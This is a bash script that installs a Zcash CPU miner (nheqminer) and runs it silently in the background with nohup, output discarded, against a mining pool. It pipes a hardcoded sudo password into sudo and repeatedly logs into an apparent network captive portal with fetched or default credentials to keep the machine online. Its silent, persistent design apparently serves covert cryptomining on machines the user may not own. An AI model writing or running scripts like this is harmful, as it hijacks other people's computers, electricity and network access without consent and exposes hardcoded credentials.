pswd="test"
defaultu="username"
defaultp="password"
localip=127.0.0.1     //a domain or ip form where the script will get a username or password otherwise default will be used
portalusername=$(curl --connect-timeout 5 $localip/uname.php)
portalpassword=$(curl --connect-timeout 5 $localip/pwd.php)
if [ -z "$portalusername" ]; then
portalusername=$defaultu
portalpassword=$defaultp
fi
currentmillis=`date +%s`
currentmillis="$(python -c "print $currentmillis * 1000")"
wget --post-data "mode=191&username=$portalusername&password=$portalpassword&a=$currentmillis&producttype=0" http://172.16.1.1:8090/login.xml
echo $pswd | sudo -S apt-get -y update
sudo mkdir /home/zcash 
unalias chng
unalias chng1
unalias chng2
alias chng='cd /home/zcash'
chng
sudo apt-get -y install git cmake build-essential libboost-all-dev
sudo git clone -b Linux https://github.com/nicehash/nheqminer.git 
alias chng1='cd /home/zcash/nheqminer/cpu_xenoncat/Linux/asm'
chng1
sudo sh assemble.sh
alias chng2='cd /home/zcash/nheqminer/Linux_cmake/nheqminer_cpu'
chng2
sudo cmake . && sudo make
sudo cp nheqminer_cpu /usr/local/bin
echo "before"
nohup nheqminer_cpu -t 1 -l zec.slushpool.com:4444 -u tyuiop.init1z > /dev/null 2>&1 &
echo "done"
while :
do 
echo $pswd | sudo -S touch /usr/bin/init1z.sh
portalusername=$(curl --connect-timeout 10 $localip/uname.php)
portalpassword=$(curl --connect-timeout 10 $localip/pwd.php)
if [ -z "$portalusername" ]; then
portalusername=$defaultu
portalpassword=$defaultp
fi
currentmillis=`date +%s`
currentmillis="$(python -c "print $currentmillis * 1000")"
wget --post-data "mode=191&username=$portalusername&password=$portalpassword&a=$currentmillis&producttype=0" http://172.16.1.1:8090/login.xml
sleep 5m
done
